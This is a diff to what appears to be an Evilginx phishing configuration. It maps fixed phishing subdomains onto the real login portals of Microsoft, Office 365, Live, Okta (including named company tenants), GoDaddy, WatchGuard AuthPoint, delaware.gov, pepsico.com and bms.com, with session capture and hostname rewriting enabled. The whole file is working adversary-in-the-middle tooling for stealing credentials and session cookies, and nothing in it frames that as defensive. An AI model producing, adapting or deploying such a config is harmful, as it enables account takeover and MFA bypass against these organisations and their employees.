@@ -11,60 +11,60 @@ min_ver: "3.0.0"
 
 #╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦(PROXY_HOSTS)╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦#
 proxy_hosts:
-  - { phish_sub: "*", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: true, wildcard: true}
+  - { phish_sub: "blue", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: true, wildcard: false}
   - { phish_sub: '', orig_sub: '', domain: 'office.com', session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "outlook", domain: "office.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "green", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "red", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "yellow", orig_sub: "outlook", domain: "office.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "orange", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: "*", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "outlook", domain: "live.com", session: true, is_landing: true, auto_filter: true, wildcard: true}
+  - { phish_sub: "purple", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "pink", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "brown", orig_sub: "outlook", domain: "live.com", session: true, is_landing: true, auto_filter: true, wildcard: false}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: "*", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "sci", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "dotfoods", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "white", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "black", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "grey", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "silver", orig_sub: "sci", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "gold", orig_sub: "ulgroup", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "copper", orig_sub: "dotfoods", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: "*", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "secure", domain: "pepsico.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "wood", orig_sub: "login", domain: "bx.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "stone", orig_sub: "msfed", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "glass", orig_sub: "advath", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "metal", orig_sub: "smusxath", domain: "bms.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "paper", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "fabric", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "plastic", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "rubber", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "cotton", orig_sub: "secure", domain: "pepsico.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: "*", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "account", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: "silk", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "wool", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
+  - { phish_sub: "leather", orig_sub: "account", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
   - { phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true, wildcard: true}
   - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
   - { phish_sub: "sso", orig_sub: "sso", domain: "secureserver.net", session: true, is_landing: false, auto_filter: true, wildcard: true}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { phish_sub: '*', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true, wildcard: true}
-  - { phish_sub: '*', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true, wildcard: true}
-  - { phish_sub: '*', orig_sub: 'reporting', domain: 'cdndex.io', session: false, is_landing:false, auto_filter: true, wildcard: true}
-  - { phish_sub: "*", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - { phish_sub: 'marble', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true, wildcard: false}
+  - { phish_sub: 'granite', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true, wildcard: false}
+  - { phish_sub: 'crystal', orig_sub: 'reporting', domain: 'cdndex.io', session: false, is_landing:false, auto_filter: true, wildcard: false}
+  - { phish_sub: "diamond", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true, wildcard: false}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - {phish_sub: '*', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true, wildcard: true}
+  - {phish_sub: 'pearl', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true, wildcard: false}
 
 #╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦(ＳＵＢ_ＦＩＬＴＥＲＳ)╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦#
 sub_filters:
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
-  - { triggers_on: "m365.cloud.microsoft", orig_sub: "m365", domain: "cloud.microsoft", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "blue.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "blue.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
+  - { triggers_on: "blue.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "green.cloud.microsoft", orig_sub: "m365", domain: "cloud.microsoft", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', replace: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
 ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "blue.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
   ##-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------##
   - {triggers_on: 'adfs.example.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'adfs.example.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
